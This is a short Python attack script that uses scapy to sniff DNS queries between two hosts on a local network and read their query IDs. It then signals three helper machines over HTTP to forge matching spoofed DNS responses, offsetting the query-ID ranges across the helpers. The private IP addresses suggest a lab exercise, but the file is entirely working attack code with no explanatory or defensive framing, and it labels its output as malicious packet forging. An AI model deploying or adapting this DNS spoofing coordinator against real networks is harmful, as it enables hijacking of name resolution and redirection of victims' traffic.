import requests
from scapy.all import *
import threading

src_ip="192.168.0.100"
dst_ip="192.168.0.200"
mal_ip="192.168.0.151"


if __name__ == "__main__":
	print("[*] Program is sniffing packets")
	
	while 1:
		sniffed_packet=sniff(iface="eth0", filter="src host " + dst_ip + " and dst host " + src_ip + " and dst port 53", count=1)
		if sniffed_packet[0].haslayer(DNS):
			dns=sniffed_packet[0].getlayer(DNS)
			qid=dns.id
			print("Malicious packet will be forged and sent - QID " + str(qid))
			
			threading.Thread(target=requests.get, args=('http://192.168.0.160:8888?start_qid=' + str(qid),)).start()
			threading.Thread(target=requests.get, args=('http://192.168.0.161:8888?start_qid=' + str(qid-1000),)).start()
			threading.Thread(target=requests.get, args=('http://192.168.0.162:8888?start_qid=' + str(qid+1000),)).start()
